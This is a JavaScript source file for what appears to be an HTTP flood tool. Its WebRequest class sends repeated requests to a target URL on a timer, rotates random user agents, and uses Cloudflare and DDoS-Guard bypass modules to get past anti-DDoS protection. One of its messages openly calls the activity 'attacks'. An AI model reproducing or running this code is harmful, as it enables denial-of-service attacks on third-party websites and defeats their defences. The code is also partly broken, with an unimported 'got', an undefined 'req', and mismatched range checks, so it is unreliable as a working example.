const Constants = require("../constants/CustomHeader")
const CustomError = require("../types/Error")
const EventEmitter = require('events');
const randomUseragent = require('random-useragent');
const CloudflareBypasser = require('cloudflare-bypasser');
let cf = new CloudflareBypasser();
const url_patern = /^https?:\/\/(?:www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)$/gm;

class WebRequest extends EventEmitter {
    constructor(client, options) {
        super();
        this.options = options;
        this._validateOptions(options)
        this.method = client.options.httpMethod;
        this.executed = 0;
        this.errored = 0;
        this._client = client;
        this.interval = null;
        this._uid = this.random(10)
        this.status = Constants.REQUEST_CREATING
        this.on("debug", msg => client.emit("requestDebug", msg, this))
        this.on("close", closeData => {
            clearInterval(this.interval)
            client.emit("WebRequestClosed", closeData)
        })
        this.emit("debug", "[Http Request] The http request is being created with Id " + this._uid + "")
    }

    /**
     *Generates a random string. This function is from https://stackoverflow.com/questions/1349404/generate-random-string-characters-in-javascript
     * @param {length} length the length of the string
     * @returns {String}
     * @private
     */
    random(length) {
        var result = '';
        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() *
                charactersLength));
        }
        return result;
    }

    delay(n) {
        return new Promise(function(resolve) {
            setTimeout(resolve, n * 1000);
        });
    }

    /**
     *Builds this Http request
     * @param {forceBuild} forceBuild If you want to force the build of this request
     * @returns {void}
     * @private
     */
    build(forceBuild = {}) {
        this.status = Constants.REQUEST_READY;
        this.emit("debug", "[Web request] Starting the request")
        const options = this.options
        const method = this.method
        this.interval = setInterval(async() => {
            if (this.status !== Constants.REQUEST_READY) return this.emit("close", {
                id: this._uid,
                reason: `The request request is not ready yet`,
                code: 500
            })
            if (this.executed >= options.repeat) {
                this.status = Constants.REQUEST_SENT;
                this.delay(1500)
                this.emit("close", {
                    id: this._uid,
                    reason: `The request is finished. Executed ${this.executed} times for ${this.errored} errored requests`,
                    code: 200
                })
                return;
            }
            if (this.errored >= options.abortNumber) {
                this.status = Constants.REQUEST_SENT;
                this.delay(2500)
                this.emit("close", {
                    id: this._uid,
                    reason: `Reached "abortNumber" limit.`,
                    code: 500
                })
                return;
            }
            try {
                this.executed++;
                // this.emit("debug", "[Web request] Attempting to " + method + " the following Url:  " + options.targetUrl + "")
                if (this._client.options.header && this._client.options.header.framework !== "base") {
                    if (this._client.options.header.framework === "ddos-guard") {
                        const ddos_guard = require("ddos-guard-bypass");
                        ddos_guard.bypass(options.targetUrl, function(err, resp) {
                            if (err) {
                                return new CustomError("[Ddos Guard] an error has occured while bypassing anti ddos")
                            } else {
                                got(options.targetUrl, {
                                    headers: {
                                        "user-agent": resp["headers"]["user-agent"],
                                        "referer": resp["headers"]["referer"],
                                        "cookie": resp["cookies"]["string"]
                                    },
                                    method: method,
                                }).then(function(resp) {
                                    if (req.statusCode > 300) this.errored++;
                                    this.emit("debug", `Got ${req.statusCode} for the request with Id ${this._uid}`)
                                });
                            }
                        });

                    } else if (this._client.options.header.framework === "got") {
                        got(options.targetUrl, {
                            headers: this._client.options.header ? this._client.options.header.content : { "User-Agent": randomUseragent.getRandom() },
                            method: method,
                        }).then(function(resp) {
                            if (req.statusCode > 300) this.errored++;
                            this.emit("debug", `Got ${req.statusCode} for the request with Id ${this._uid}`)
                        });
                    }
                } else {
                    cf.request({
                        url: options.targetUrl,
                        method: method,
                        headers: this._client.options.header ? this._client.options.header.content : { "User-Agent": randomUseragent.getRandom() },
                    }).then(req => {
                        if (req.statusCode > 300) this.errored++;
                        this.emit("debug", `Got ${req.statusCode} for the request with Id ${this._uid}`)
                    })
                }
            } catch (error) {
                console.log(error)
                this.errored++;
            }
        }, options.requestDelay);

    }

    async _validateOptions(options) {
        if (!url_patern.test(options.targetUrl)) return new CustomError("The provided URl for the the \"createHttpRequest\" is not a valid url!")
        if (options.targetUrl.startsWith("http://") && !this._client.options.supportsHttp) return new CustomError("Attacks on http websites are disabled")
        if (typeof(options.defaultSettings) !== "boolean") return new CustomError("An error has occured while creating the http request:\n\"defaultSettings\" is not provided or is not a boolean. Must be true/false")
        if (typeof(options.requestDelay) !== "number") return new CustomError("An error has occured while creating the http request:\n\"requestDelay\" is not provided or is not a valid number")
        if (typeof(options.abortNumber) !== "number") return new CustomError("An error has occured while creating the http request:\n\"abortNumber\" is not provided or is not a valid number")
        if (options.requestDelay < 0 || options.requestDelay > 60000) return new CustomError("The \"requestDelay\" option is not in the 0-6000 range.")
        if (options.abortNumber < 0 || options.abortNumber < 5) return new CustomError("The \"abortNumber\" option is not in the 0-5 range.")
        return true
    }
}
module.exports = WebRequest